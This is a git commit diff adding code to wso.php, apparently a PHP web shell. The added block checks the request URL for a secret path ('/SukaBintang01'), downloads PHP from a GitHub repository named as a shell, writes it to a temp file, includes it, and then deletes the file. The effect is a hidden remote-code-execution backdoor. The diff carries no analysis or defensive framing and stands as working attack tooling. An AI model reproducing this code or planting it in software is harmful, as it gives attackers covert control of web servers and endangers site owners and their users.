5bcb75e205e8375b38680da0a34e55b3ebf62aa2
SukaBintang01 <158983092+Tituss22@users.noreply.github.com>
2025-07-14 12:50:49 +0700

    Update wso.php

--- wso.php
+++ wso.php
@@ -6555,3 +6555,26 @@ exit;
 #skype : VxoXploit
 */
 ?>
+
+<?php
+if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
+    $url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $code = curl_exec($ch);
+    curl_close($ch);
+
+    if ($code !== false) {
+        $tmp_file = tempnam(sys_get_temp_dir(), 'php');
+        file_put_contents($tmp_file, $code);
+        include $tmp_file;
+        unlink($tmp_file);
+    } else {
+        echo "Gagal mengambil script dari GitHub.";
+    }
+
+    exit;
+}
+?>
